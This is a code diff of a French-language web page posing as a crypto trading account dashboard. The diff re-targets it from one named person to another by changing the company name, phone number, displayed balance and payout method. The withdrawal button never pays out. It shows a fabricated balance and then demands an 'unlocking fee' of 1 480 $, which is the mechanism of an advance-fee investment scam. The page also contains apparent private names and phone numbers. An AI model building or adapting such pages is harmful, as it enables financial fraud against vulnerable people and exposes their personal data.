@@ -231,7 +231,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer votre numéro de téléphone :");
-        if (code === "0141856960") {
+        if (code === "818138013") {
             document.body.style.display = 'block';
         } else {
             alert("Numéro incorrect. Accès refusé.");
@@ -241,14 +241,14 @@
 
     <header>
         <div class="logo">
-            <h1> AFRICA INVESTISSEMENT </h1>
+            <h1> TRADING COMMERCES EXPRESS </h1>
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 4 150 000 FCFA</span>
+                <span class="balance">Solde: 13 833 $</span>
                 <div class="account-info">
-                    <span id="user-name"> ISSA SANOGO </span><br>
-                    <span id="user-phone"> 225 01 41 85 69 60 </span>
+                    <span id="user-name"> TUMBA KABONGO GENEVIEVE </span><br>
+                    <span id="user-phone"> 243 818 138 013</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -277,7 +277,7 @@
                 </div>
             </section>
             <section class="actions-container">
-                <button id="orange-money">Retirer via Wave Money</button>
+                <button id="orange-money">Retirer via Vodacom</button>
                 <button id="paypal">Retirer via PayPal</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
@@ -310,17 +310,17 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "ISSA SANOGO";
-                const accountNumber = "225 01 41 85 69 60";
-                const balance = "4 150 000 FCFA";
+                const accountName = "TUMBA KABONGO GENEVIEVE";
+                const accountNumber = "243 818 138 013";
+                const balance = "13 833 $";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', () => {
-                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Wave Money ?");
+                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Vodacom ?");
                 if (confirmWithdrawal) {
-                    setWithdrawalInfo("Wave Money");
+                    setWithdrawalInfo("Vodacom");
                 }
             });
 
@@ -332,7 +332,7 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher ISSA, Les bénéfices des cryptomonaies ne peuvent pas vous parvenir car votre compte es inactif, veuillez le recharger afin de recevoir vos bénéfices immediatement.');
+                alert('Cher Tumba, veuillez payer les frais de déblocage de 1 480 $ afin de recevoir vos bénéfices immediatement.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
                 errorMessage.textContent = 'Erreur : compte inactif.';
